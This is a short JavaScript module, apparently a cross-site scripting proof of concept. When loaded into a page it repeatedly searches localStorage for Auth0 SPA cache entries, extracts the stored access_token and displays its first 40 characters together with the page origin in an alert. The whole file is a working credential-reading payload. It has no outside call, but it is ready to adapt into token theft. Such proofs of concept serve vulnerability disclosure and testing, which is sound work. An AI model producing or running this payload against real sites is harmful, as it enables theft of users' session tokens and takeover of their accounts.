System.register([], function () {
  return { execute: function () {
    function look() {
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        if (!/auth0spajs/.test(k)) continue;
        try { var v = JSON.parse(localStorage.getItem(k));
          if (v && v.body && v.body.access_token) return [k, v.body.access_token]; } catch (e) {}
      }
      return null;
    }
    var tries = 0;
    var t = setInterval(function () {
      var r = look();
      if (r || ++tries > 20) {
        clearInterval(t);
        alert("XSS in origin: " + location.origin +
              "\nkey: " + (r ? r[0] : "none") +
              "\naccess_token (first 40): " + (r ? r[1].slice(0,40)+"…" : "(none)"));
      }
    }, 250);
  }};
});
